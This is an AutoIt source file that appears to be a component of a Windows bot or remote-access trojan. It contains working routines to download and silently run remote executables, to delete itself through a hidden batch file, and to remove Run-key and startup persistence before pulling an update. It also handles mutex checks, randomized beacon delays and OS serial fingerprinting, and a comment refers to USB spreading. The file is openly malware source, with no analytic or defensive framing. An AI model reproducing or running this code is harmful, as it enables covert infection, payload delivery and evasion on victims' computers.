Func GetBrowser()
    Return RegRead("HKEY_CURRENT_USER\Software\Clients\StartMenuInternet", "")
EndFunc

Func Mutex()
   If Semaphore() Then
	  Exit
   EndIf
EndFunc

Func Semaphore()
   Local $ERROR_ALREADY_EXISTS = 183
   DllCall("kernel32.dll", "int", "CreateSemaphore", "int", 0, "long", 1, "long", 1, "str", $MUTEX_STRING)
   Local $lastError = DllCall("kernel32.dll", "int", "GetLastError")
   If $lastError[0] = $ERROR_ALREADY_EXISTS Then Exit -1
EndFunc
	
Func Debug($sMsg = "Hola")
   ConsoleWrite($sMsg)
EndFunc

Func SelfDelete($iDelay = 0)
    Local $sCmdFile
    FileDelete(@TempDir & "\scratch.bat")
    $sCmdFile = '@ECHO OFF' & @CRLF _
			& 'ping -n ' & $iDelay & ' 127.0.0.1 > nul' & @CRLF _
            & 'if exist "' & @ScriptFullPath & '" (' & @CRLF _
			& 'del "' & @ScriptFullPath & '" >nul' & @CRLF _
			& ')' & @CRLF _
			& 'ping -n 5 127.0.0.1 > nul' & @CRLF _
			& 'del ' & @TempDir & '\scratch.bat >nul'
    FileWrite(@TempDir & "\scratch.bat", $sCmdFile)
    Run(@TempDir & "\scratch.bat", @TempDir, @SW_HIDE)
    Run($INSTALL_PATH)
EndFunc
 
Func DownloadAndExecute($sUrl, $sName, $sDelay = 0)
   InetGet($sUrl, EnvGet("TEMP") & "\" & $sName)
   Sleep($sDelay)
   Run(EnvGet("TEMP") & "\" & $sName)
EndFunc

Func Update($sUrl, $sName)
   RegDelete("HKEY_CURRENT_USER\SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\POLICIES\EXPLORER\RUN\", @ScriptName)
   RegDelete("HKEY_CURRENT_USER\SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\RUN\", @ScriptName)

   If FileExists(@StartupDir & "\WINDOWS.LNK") Then
	  FileDelete(@StartupDir & "\WINDOWS.LNK")
   EndIf
   DownloadAndExecute($sUrl, $sName, 10)
   SelfDelete(0)
   Exit
EndFunc

Func RandomSleep()
   Sleep(Random($CONNECTION_DELAY-(($CONNECTION_DELAY*25)/100), $CONNECTION_DELAY+(($CONNECTION_DELAY*25)/100)))
EndFunc

Func RandomString()
   $MAXLENGTH = Random(Random(10, 25), Random(30, 40))
   Local $RET = ''
   For $i = 1 To $MAXLENGTH
	  $RET &= Chr(Random(97, 122))
   Next
   Return $RET
EndFunc

Func _SetEnvironment($sEnvironmentVar, $sData, $iAllUsers = 0) ;~ [Blau] Para USB Spread
    Local $i64Bit = "", $sRegistryKey = ""
 
    If StringStripWS($sEnvironmentVar, 8) = "" Then
        Return SetError(1, 0, 0)
    EndIf
 
    If @OSArch = "X64" Then
        $i64Bit = "64"
    EndIf
    If $iAllUsers Then
        $sRegistryKey = "HKEY_LOCAL_MACHINE" & $i64Bit & "\SYSTEM\CurrentControlSet\Control\Session Manager\Environment"
    Else
        $sRegistryKey = "HKEY_CURRENT_USER" & $i64Bit & "\Environment"
    EndIf
 
    If StringStripWS($sData, 8) = "" Then
        Return RegDelete($sRegistryKey, $sEnvironmentVar)
    Else
        Return RegWrite($sRegistryKey, $sEnvironmentVar, "REG_SZ", $sData)
    EndIf
 EndFunc   ;==>_SetEnvironment
 
Func _OSSerial()
    Local $oWMIService = ObjGet("winmgmts:{impersonationLevel = impersonate}!\\" & "." & "\root\cimv2")
    Local $oColFiles = $oWMIService.ExecQuery("Select * From Win32_OperatingSystem")
    If IsObj($oColFiles) Then
        For $oObjectFile In $oColFiles
            Return $oObjectFile.SerialNumber
        Next
    EndIf
    Return SetError(1, 0, 0)
EndFunc   ;==>OSSerial